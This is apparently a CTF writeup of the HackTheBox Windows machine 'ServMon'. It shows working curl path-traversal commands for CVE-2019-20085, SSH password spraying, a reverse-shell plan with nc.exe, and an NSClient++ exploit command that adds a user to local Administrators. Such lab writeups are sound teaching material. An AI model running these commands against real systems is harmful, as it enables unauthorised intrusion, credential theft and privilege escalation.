+++
date = '2026-08-05T20:08:23+02:00'
draft = false
title = 'ServMon Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`05/08/2026`**

![ServMon.png](/images/imgs_servmon/ServMon.png)

---
# Introduction

**_ServMon_** is a **Windows** machine officially rated as **Easy**, but realistically, it plays much more like a **Medium** box—and arguably one of the most frustrating ones due to an incredibly unstable service during the Privilege Escalation phase.

The initial foothold is straightforward: it starts with **anonymous FTP** access leading to **information disclosure**, which reveals the location of a password file. By exploiting an **unauthenticated Path Traversal (CVE-2019-20085)** in the **NVMS-1000** web application, I was able to read the password file and **password-spray** my way into the machine via **SSH**. 
The Privilege Escalation relies on abusing a local monitoring agent (**NSClient++**) to execute commands as **SYSTEM**. While the theory is simple, the Web GUI of the application is extremely buggy. To avoid losing my sanity, I had to pivot away from manual GUI exploitation and leverage an exploit script to interact directly with the application's API.

---
# Techniques Used

- **Anonymous FTP & Information Disclosure**
- **NVMS-1000 Path Traversal (CVE-2019-20085)**
- **Password Spraying**
- **SSH Local Port Forwarding**
- **NSClient++ Privilege Escalation (Authenticated RCE)**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- servmon -Pn -T5
```

```text
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http        
135/tcp   open     msrpc   
139/tcp   open     netbios-ssn 
445/tcp   open     microsoft-ds 
... [snip] ...
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV servmon -Pn
```

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd                                          
| ftp-syst:                    
|_  SYST: Windows_NT               
| ftp-anon: Anonymous FTP login allowed (FTP code 230)               
|_02-28-22  07:35PM       <DIR>          Users                                
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)         
| ssh-hostkey:               
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)            
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)                  
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)               
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Host script results:
| smb2-time: 
|   date: 2026-08-05T13:00:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## FTP Enumeration

Seeing that **Anonymous FTP** login was allowed, I started there:

```bash
ftp anonymous@servmon 21
```

Browsing through the directory structure, I found a **`Users`** folder containing directories for **Nadine** and **Nathan**.
I downloaded two interesting files: **`Confidential.txt`** from **Nadine**'s folder and **`Notes to do.txt`** from **Nathan**'s.

![ftp.png](/images/imgs_servmon/ftp.png)

- **`Confidential.txt`**:

![confi.png](/images/imgs_servmon/confi.png)

- **`Notes to do.txt`**:

![todo.png](/images/imgs_servmon/todo.png)

This was a massive information leak. I now knew there was a **`Passwords.txt`** file sitting on **Nathan**'s Desktop (**`C:\Users\Nathan\Desktop\Passwords.txt`**).

---
# Initial Access | NVMS Path Traversal & Password Spraying

Looking at port **80**, the web page hosted an instance of **NVMS-1000** (a **Network Video Management System**).

![web.png](/images/imgs_servmon/web.png)

A quick search online revealed it was vulnerable to **CVE-2019-20085**.

**Note**: _**[CVE-2019-20085](https://www.exploit-db.com/exploits/47774)** is an **Unauthenticated Directory Traversal** vulnerability in **NVMS-1000**. The web server fails to properly sanitize **`../`** sequences in the HTTP request. This allows an attacker to escape the web root directory and **read arbitrary files** on the underlying **Windows** file system using the privileges of the web server._

![cve.png](/images/imgs_servmon/cve.png)

I tested the vulnerability manually using **curl** to grab the standard **`win.ini`** file.

```bash
curl -v --path-as-is "http://servmon/../../../../../../../../../../../../windows/win.ini"
```

![winini.png](/images/imgs_servmon/winini.png)

**Note**: _the use of **`--path-as-is`** to prevent **curl** from resolving the **`../`** locally before sending the request._

Knowing the exact path from the **FTP** notes, I extracted **Nathan**'s password file:

```bash
curl --path-as-is "http://servmon/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" 
```

![pass.png](/images/imgs_servmon/pass.png)

I saved these into a **`pass.txt`** file and attempted a **password spray** against the two known users (**nathan** and **nadine**) over **SSH** using **NetExec**:

```bash
nxc ssh servmon -u nathan -p pass.txt --continue-on-success
nxc ssh servmon -u nadine -p pass.txt --continue-on-success
```

![spray.png](/images/imgs_servmon/spray.png)

I got a valid hit for **nadine**.

![userf.png](/images/imgs_servmon/userf.png)

I successfully logged in via **SSH** and grabbed the **user flag**.

---
# Privilege Escalation | NSClient++ & The Web GUI Nightmare

Exploring the filesystem, I noticed a non-default program installed in **`C:\Program Files\NSClient++`**.

![program.png](/images/imgs_servmon/program.png)

**Note**: _**NSClient++** is a monitoring agent/daemon for **Windows** systems. It allows monitoring servers to execute scripts, check system metrics, and gather data. It features a web interface and an API. If an attacker can access the web interface or API, they can often schedule and execute **custom external scripts**. Since the **NSClient++** service usually runs as **`NT AUTHORITY\SYSTEM`**, this directly leads to **Local Privilege Escalation**._

I analyzed its configuration file to look for credentials, since by default they are stored in:

- **`C:\Program Files\NSClient++\nsclient.ini`**

![ini.png](/images/imgs_servmon/ini.png)

I found the **administrator** password in cleartext: **`ew2x6SsGTxjRwXOT`**.

Since the **NSClient++** Web UI is hosted on port **8443** and I already had an **SSH** session, I set up a tunnel:

```bash
ssh -L 8443:127.0.0.1:8443 nadine@servmon
```

![nscweb.png](/images/imgs_servmon/nscweb.png)

## The GUI Frustration

I searched for Local Privilege Escalation methods for this software and found a well-documented process.

- **https://github.com/advisories/GHSA-jr25-22p3-gm6r**

The standard exploit path involves:

1. **Logging into the Web GUI**.

2. **Enabling the `CheckExternalScripts` and `Scheduler` modules**.

3. **Uploading `nc.exe` and a malicious `.bat` file.**

4. **Adding a new script to call the **`.bat`** file and scheduling it to run every minute.**

5. **Reloading the service to pop a `SYSTEM` reverse shell.**

I meticulously followed these steps. I transferred `nc.exe`** and my **`.bat`** payload into **`C:\Windows\Temp\`**, configured the **GUI**, and reloaded the service.

![privesc2.png](/images/imgs_servmon/privesc2.png)

![privesc4.png](/images/imgs_servmon/privesc4.png)

I was receiving a connection, but no shell.

![root.png](/images/imgs_servmon/root.png)

I tried replacing the payload with **PowerShell**, standard **cmd** commands, and various other reverse shells. Not only did none of them work, but the web interface started breaking entirely. I kept receiving constant connection errors, forcing me to repeatedly restart the **HTB** machine. It was an incredibly frustrating loop.

## The API Route (Exploit-DB 48360)

Realizing the **GUI** was a dead end on this specific instance, I searched for alternative ways to interact with the software. 

I found an exploit script on **Exploit-DB**: **[EDB-ID: 48360](https://www.exploit-db.com/exploits/48360)** that bypasses the unstable **GUI** and interacts directly with the **NSClient++ REST API**.

Since I have **Athenticated RCE**, instead of trying to catch a reverse shell, I decided to use the exploit to simply add **nadine** to the local **Administrators** group:

```bash
python3 exp.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'cmd.exe /c net localgroup Administrators /add nadine'
```

The script executed successfully. I checked my group memberships in the **SSH** session, but access to **`C:\Users\Administrator`** was still denied.

Since **WinRM** wasn't open, I couldn't use **Evil-WinRM**. However, **SMB** was open, so I authenticated using **Impacket**'s **`psexec.py`** with **Nadine**'s credentials (now acting as a **local Admin**):

```bash
psexec.py servmon/nadine:'<nadine_password>'@servmon
```

![rootf.png](/images/imgs_servmon/rootf.png)

It instantly dropped me into an **`NT AUTHORITY\SYSTEM`** shell. I navigated to the **Administrator**'s desktop and grabbed the **root flag**.

---
# Final Thoughts

**_ServMon_** is a machine that tests your patience as much as your skills.

The initial foothold is feels very much like an **Easy** box: piecing together information from an **anonymous FTP** server and using a simple **curl** command to execute a **Path Traversal** is a clean, logical progression.

The Privilege Escalation, however, pushes this box firmly into **Medium** territory, mainly due to the instability of the intended path. Spending hours wrestling with a broken Web GUI that requires constant machine resets was so frustrating. However, it forced a very valuable lesson: when the graphical interface fails you, always look for a way to interact with the underlying **API** or **CLI**.

**Sources**:

- **NVMS-1000 Arbitrary File Read (CVE-2019-20085) | https://www.exploit-db.com/exploits/47774**

- **NSClient++ Privilege Escalation (GUI Method)https://github.com/advisories/GHSA-jr25-22p3-gm6r**

- **NSClient++ Privilege Escalation (API Exploit) | https://www.exploit-db.com/exploits/48360**